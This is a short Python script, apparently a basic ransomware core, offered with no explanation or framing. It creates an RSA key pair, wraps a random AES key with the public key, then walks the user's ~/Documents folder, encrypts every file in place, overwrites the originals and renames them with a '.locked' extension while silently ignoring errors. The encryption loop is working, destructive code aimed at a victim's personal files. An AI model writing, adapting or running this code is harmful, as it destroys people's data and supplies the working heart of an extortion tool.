import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

def generate_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    with open("private.pem", "wb") as f:
        f.write(private_key)
    with open("public.pem", "wb") as f:
        f.write(public_key)

def encrypt_aes_key(aes_key, public_key_path):
    with open(public_key_path, "rb") as f:
        recipient_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_key = cipher_rsa.encrypt(aes_key)
    return enc_key

def encrypt_file(file_path, aes_key):
    cipher = AES.new(aes_key, AES.MODE_EAX)
    with open(file_path, "rb") as f:
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file_path, "wb") as f:
        f.write(cipher.nonce + tag + ciphertext)

def encrypt_directory(path, public_key_path):
    aes_key = get_random_bytes(32)
    enc_aes_key = encrypt_aes_key(aes_key, public_key_path)
    with open("aes_key.encrypted", "wb") as f:
        f.write(enc_aes_key)

    for root, dirs, files in os.walk(path):
        for file in files:
            if not file.endswith(".locked"):
                full_path = os.path.join(root, file)
                try:
                    encrypt_file(full_path, aes_key)
                    os.rename(full_path, full_path + ".locked")
                except Exception:
                    continue

def main():
    target_dir = os.path.expanduser("~/Documents")
    encrypt_directory(target_dir, "public.pem")
